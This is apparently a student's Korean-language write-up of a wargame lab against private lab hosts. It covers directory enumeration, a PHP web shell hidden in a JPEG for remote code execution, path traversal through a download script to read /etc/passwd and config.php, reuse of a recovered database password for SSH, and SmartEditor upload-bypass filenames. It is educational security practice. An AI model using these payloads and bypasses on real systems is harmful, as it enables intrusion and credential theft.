# 2026-07-09 워게임 실습 정리 (LFI · SmartEditor 취약점 분석)

# 목표

이번 실습에서는 웹 애플리케이션의 취약점을 분석하여

* 디렉터리 및 파일 탐색
* LFI(Local File Inclusion / Path Traversal)
* 설정 파일(config.php) 탈취
* 데이터베이스 계정 정보 획득
* SSH 접근
* SmartEditor 업로드 기능 분석

까지 진행하였다.

---

# 1. gmeditor 분석

## 개념

`gmeditor`는 웹 게시판에서 사용하는 웹 에디터(텍스트 에디터)이다.

대표적인 웹 에디터

* SmartEditor
* CKEditor
* TinyMCE

등과 비슷한 역할을 한다.

웹 에디터는 일반적으로

* 이미지 업로드
* 파일 업로드
* HTML 작성

기능을 가지고 있기 때문에

**취약점이 가장 많이 발생하는 부분 중 하나이다.**

---

## 처음 확인한 내용

검색

```
index of gmeditor
```

확인 결과

```
gmeditor = 웹 에디터
```

라는 것을 확인하였다.

---

## 접근

```
http://172.16.11.217/gmeditor/
```

결과

```
403 Forbidden
```

---

## 디렉터리 탐색

사용한 도구

```
DirBuster
dirb
nikto
```

발견

```
/uploaded/
/media.php
/demo.php
```

---

## 업로드 테스트

다양한 확장자를 업로드했지만

업로드 실패

→ 단순 확장자뿐 아니라

**실제 파일 내용(Content)도 검사**

하는 것으로 판단하였다.

---

# 2. ImageMagick 이용

## 목적

정상 JPEG 파일 안에 PHP 코드를 삽입

---

### 설치

```bash
sudo apt install -y imagemagick
```

---

### 이미지 축소

```bash
sudo convert -resize 1x1 cat.jpeg cat2.jpeg
```

---

### 확인

```bash
identify cat2.jpeg
```

---

### PHP 코드 삽입

```bash
echo "<?php system(\$_GET['cmd']); ?>" >> cat2.jpeg
```

---

### 확장자 변경

```bash
cp cat2.jpeg cat2.php
```

---

## 결과

업로드 성공

```
http://172.16.11.217/gmeditor/uploaded/img/1783560509.php
```

명령 실행

```
?cmd=id
```

또는

```
?cmd=cat /etc/passwd
```

정상 실행

---

## 의미

이 서버는

* 업로드 검증이 매우 약했고
* 업로드 후 PHP로 저장되었으며
* Apache가 PHP 스크립트로 실행하였다.

즉

**업로드 취약점 → RCE(Remote Code Execution)**

까지 이어질 수 있었다.

---

# 3. LFI(Path Traversal) 분석

## 다운로드 주소 발견

```
filedown.php
```

실제 주소

```
http://172.16.11.216/filedown.php
```

파라미터

```
BRD_ID
STORED
ORIGINAL
```

---

## 중요 포인트

```
ORIGINAL
```

↓

다운로드될 파일 이름

반면

```
STORED
```

↓

실제 서버 파일 경로

따라서

공격 대상은

```
STORED
```

였다.

---

## Path Traversal

```
../../../../../../../../../../etc/passwd
```

성공

```
curl ".../filedown.php?STORED=../../../../../../../../../../etc/passwd"
```

---

## 왜 중요한가?

Path Traversal은

웹 서버 밖의 파일까지 읽게 만드는 취약점이다.

대표적으로 읽는 파일

```
/etc/passwd
```

```
/etc/shadow
```

```
config.php
```

```
.env
```

등이다.

---

# 4. config.php 탈취

읽기 성공

```
/var/www/config/config.php
```

발견 내용

```
DB_HOST

DB_NAME

DB_USER

DB_PASS
```

획득한 정보

```
victim_www
wwwadm15889
```

---

## 왜 중요한가?

대부분의 개발자는

DB 비밀번호와

Linux 계정 비밀번호를

같게 사용하는 경우가 많다.

따라서

```
config.php
```

를 읽는 것은

가장 가치 있는 공격 중 하나이다.

---

# 5. SSH 로그인 성공

접속

```bash
ssh \
-o KexAlgorithms=+diffie-hellman-group14-sha1 \
-o HostKeyAlgorithms=+ssh-rsa \
victim_www@172.16.11.216
```

확인

```bash
whoami
```

```
victim_www
```

```bash
id
```

```
uid=1001(victim_www)
```

```bash
hostname
```

```
filedown
```

---

## 공격 흐름

```
LFI

↓

config.php

↓

DB 계정

↓

Linux 계정 재사용

↓

SSH 로그인
```

실제 침투 테스트에서도 매우 자주 등장하는 시나리오이다.

---

# 6. SmartEditor 2.0 분석

Nikto 결과

```
SmartEditor 2.0 Basic Vulnerability
```

발견

```
sample.php

photo_uploader.html

file_uploader_html5.php
```

즉

업로드 기능이 존재한다는 것을 확인하였다.

---

# 7. 업로드 테스트

정상 JPEG

```
cat.jpg
```

업로드 성공

```
upload/cat.jpg
```

확인 완료

---

## 업로드 API

```bash
curl -F "Filedata=@test.jpg" \
http://172.16.11.221/smarteditor2-2.8.2/sample/photo_uploader/file_uploader_html5.php
```

응답

```
NOTALLOW_
```

---

## 확인한 사실

* 업로드 API 존재
* POST 요청 정상
* 업로드 로직 실행
* 이미지는 정상 업로드 가능
* PHP 파일은 차단

---

# 8. 웹셸 업로드 시도

생성

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

멀티 확장자

```
shell.php.jpg
```

업로드

```bash
curl -F "Filedata=@shell.php;filename=shell.php.jpg"
```

실패

---

# 9. 교수님 힌트

예전 SmartEditor는

널 바이트 관련 취약점이 존재하였다.

예시

```
test.php.%80....php%80.jpg
```

파일명을 우회하여

PHP로 저장되도록 만드는 방식이다.

실습에서는

```
%80
```

기법도 테스트했지만

성공하지는 못하였다.

---

# 10. 이번 실습에서 배운 핵심 개념

## Directory Enumeration

웹 서버에 숨겨진

```
admin/

upload/

backup/

demo/

sample/
```

등을 찾는 과정

도구

* dirb
* DirBuster
* gobuster
* nikto

---

## File Upload Vulnerability

업로드 기능 검증이 약하면

웹셸 업로드가 가능하다.

공격 흐름

```
파일 업로드

↓

웹셸 업로드

↓

명령 실행

↓

RCE
```

---

## Path Traversal

```
../../
```

를 이용하여

원래 접근하면 안 되는

파일을 읽는다.

---

## LFI

웹 서버 내부 파일을 읽는다.

대표 목표

```
config.php
```

```
.env
```

```
/etc/passwd
```

---

## config.php

가장 중요한 파일 중 하나

왜냐하면

거의 항상

```
DB 계정

DB 비밀번호

경로

환경설정
```

이 들어 있기 때문이다.

---

## Credential Reuse

DB 비밀번호

↓

Linux 계정

↓

SSH 로그인

↓

권한 상승 시도

실무에서도 자주 발생하는 문제이다.

---

## SmartEditor

예전 버전은

업로드 관련 취약점이 여러 차례 보고되었다.

대표적으로

* 파일명 검증 우회
* 업로드 검증 부족
* 이미지 처리 로직 취약점

등이 알려져 있다.

---

# 사용한 주요 명령어

### Dirb

```bash
dirb http://172.16.11.217/
```

---

### Nikto

```bash
nikto -h http://172.16.11.221
```

---

### ImageMagick

```bash
convert -resize 1x1 cat.jpeg cat2.jpeg
identify cat2.jpeg
```

---

### curl

```bash
curl URL
```

다운로드

```bash
curl URL --output file
```

파일 업로드

```bash
curl -F "Filedata=@cat.jpg" URL
```

---

### SSH

```bash
ssh user@ip
```

구버전 알고리즘 사용

```bash
-o KexAlgorithms=+diffie-hellman-group14-sha1
```

```bash
-o HostKeyAlgorithms=+ssh-rsa
```

---

# 워게임에서 이런 취약점이 중요한 이유

워게임은 단순히 취약점을 찾는 것이 아니라 **여러 취약점을 연결(chain)하여 최종 목표를 달성하는 과정**을 연습하는 환경이다.

이번 실습에서도 하나의 취약점만으로 끝나지 않았다.

```
Directory Enumeration
        ↓
숨겨진 기능 발견
        ↓
LFI(Path Traversal)
        ↓
config.php 읽기
        ↓
DB 계정 및 비밀번호 획득
        ↓
비밀번호 재사용(Credential Reuse)
        ↓
SSH 로그인 성공
```

또한 업로드 기능에서는 다음과 같은 공격 흐름을 실습하였다.

```
업로드 기능 분석
        ↓
확장자 및 파일 내용 검증 확인
        ↓
이미지 업로드 성공
        ↓
웹셸 업로드 가능성 분석
        ↓
RCE 가능 여부 확인
```

실제 침투 테스트에서도 이러한 취약점들은 자주 발견되며, 개별 취약점보다 **취약점을 연결하여 시스템 장악으로 이어지는 과정**을 이해하는 것이 더욱 중요하다.

---

# 느낀 점

* 업로드 취약점은 단순히 파일을 올리는 문제가 아니라 RCE로 이어질 수 있는 매우 위험한 취약점임을 확인했다.
* LFI는 단순히 파일을 읽는 것으로 끝나지 않고, 설정 파일을 통해 계정 정보를 획득하여 SSH 접근까지 연결될 수 있음을 실습으로 이해했다.
* SmartEditor와 같은 오래된 웹 에디터는 과거에 다양한 취약점이 보고되었으며, 업로드 기능과 파일명 검증 방식에 대한 이해가 중요함을 배웠다.
* 워게임에서는 하나의 기법만 사용하는 것이 아니라 정보 수집, 취약점 분석, 권한 획득을 단계적으로 연결하는 사고방식이 중요하다는 점을 다시 확인하였다.
